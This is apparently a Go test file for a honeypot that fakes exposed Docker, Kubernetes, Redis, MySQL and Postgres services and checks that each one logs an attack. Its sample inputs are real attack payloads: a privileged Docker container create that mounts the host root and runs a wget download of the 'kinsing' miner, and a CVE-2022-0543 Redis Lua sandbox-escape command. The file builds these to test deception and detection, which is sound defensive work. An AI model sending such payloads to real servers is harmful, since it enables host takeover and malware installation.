package infratrap

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/harris/honeypot/internal/canary"
	honeypotv1 "github.com/harris/honeypot/proto/gen/honeypot/v1"
)

func TestInfraTrapsAllFiveProtocols(t *testing.T) {
	var mu sync.Mutex
	var events []*honeypotv1.TelemetryEvent
	var allURLs []string
	emit := func(ev *honeypotv1.TelemetryEvent, urls []string) {
		mu.Lock()
		defer mu.Unlock()
		events = append(events, ev)
		allURLs = append(allURLs, urls...)
	}

	// 1. Docker :2375
	dockerSrv := httptest.NewServer(NewDockerAPIHandler("n1", 2375, emit))
	defer dockerSrv.Close()
	resp, err := dockerSrv.Client().Post(dockerSrv.URL+"/v1.43/containers/create", "application/json", strings.NewReader(`{"Image":"alpine:latest","Cmd":["sh","-c","wget http://203.0.113.88/kinsing"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}`))
	if err != nil || resp.StatusCode != 201 {
		t.Fatalf("Docker trap create failed: resp=%v err=%v", resp, err)
	}
	_ = resp.Body.Close()

	// 2. K8s :6443 / :10250
	pool := canary.NewSensorKeyPool()
	pool.AddSeeds([]*honeypotv1.CanaryKeySeed{{CanaryKeyId: "k8s-can", KeyPlaintext: "sk-proj-k8sleak00000000000000000", ProviderStyle: "openai"}})
	k8sSrv := httptest.NewServer(NewKubernetesHandler("n1", "https://ai.example", 6443, pool, emit))
	defer k8sSrv.Close()
	kResp, err := k8sSrv.Client().Get(k8sSrv.URL + "/api/v1/namespaces/default/secrets")
	if err != nil || kResp.StatusCode != 200 {
		t.Fatalf("K8s secrets trap failed: %v", err)
	}
	_ = kResp.Body.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 3. Redis :6379 + CVE-2022-0543
	rLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = ServeRedisRESP(ctx, rLn, "n1", 6379, emit) }()
	rConn, err := net.Dial("tcp", rLn.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	luaScript := `local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); return io_l().popen('id'):read('*a')`
	_, _ = fmt.Fprintf(rConn, "*3\r\n$4\r\nEVAL\r\n$%d\r\n%s\r\n$1\r\n0\r\n", len(luaScript), luaScript)
	rBuf := make([]byte, 256)
	rn, _ := rConn.Read(rBuf)
	_ = rConn.Close()
	if !strings.Contains(string(rBuf[:rn]), "uid=") {
		t.Fatalf("expected CVE-2022-0543 simulated id output, got %q", string(rBuf[:rn]))
	}

	// 4. MySQL :3306
	mLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = ServeMySQLTrap(ctx, mLn, "n1", 3306, emit) }()
	mConn, err := net.Dial("tcp", mLn.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	mGreet := make([]byte, 128)
	mn, _ := mConn.Read(mGreet)
	if mn < 20 || !strings.Contains(string(mGreet[:mn]), "8.0.36") {
		t.Fatalf("unexpected MySQL greeting: %q", string(mGreet[:mn]))
	}
	var respPkt [38]byte
	copy(respPkt[:4], []byte{34, 0, 0, 1})
	copy(respPkt[4+32:], []byte("root\x00\x00"))
	_, _ = mConn.Write(respPkt[:])
	_, _ = io.ReadAll(mConn)
	_ = mConn.Close()

	// 5. Postgres :5432
	pLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = ServePostgresTrap(ctx, pLn, "n1", 5432, emit) }()
	pConn, err := net.Dial("tcp", pLn.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	var startup bytes.Buffer
	_ = binary.Write(&startup, binary.BigEndian, int32(0))
	_ = binary.Write(&startup, binary.BigEndian, int32(196608))
	startup.WriteString("user\x00postgres\x00database\x00prod\x00\x00")
	rawStartup := startup.Bytes()
	binary.BigEndian.PutUint32(rawStartup[:4], uint32(len(rawStartup)))
	_, _ = pConn.Write(rawStartup)

	authReq := make([]byte, 9)
	_, _ = io.ReadFull(pConn, authReq)
	if authReq[0] != 'R' {
		t.Fatalf("expected Postgres AuthenticationRequest 'R', got %q", authReq[0])
	}
	pw := "hunter2\x00"
	var pwMsg bytes.Buffer
	pwMsg.WriteByte('p')
	_ = binary.Write(&pwMsg, binary.BigEndian, int32(4+len(pw)))
	pwMsg.WriteString(pw)
	_, _ = pConn.Write(pwMsg.Bytes())
	_, _ = io.ReadAll(pConn)
	_ = pConn.Close()

	mu.Lock()
	defer mu.Unlock()
	if len(events) != 5 {
		t.Fatalf("expected 5 telemetry events across all 5 infra traps, got %d", len(events))
	}
	if len(allURLs) == 0 || !strings.Contains(allURLs[0], "kinsing") {
		t.Fatalf("expected docker malware URL extracted, got %v", allURLs)
	}
}
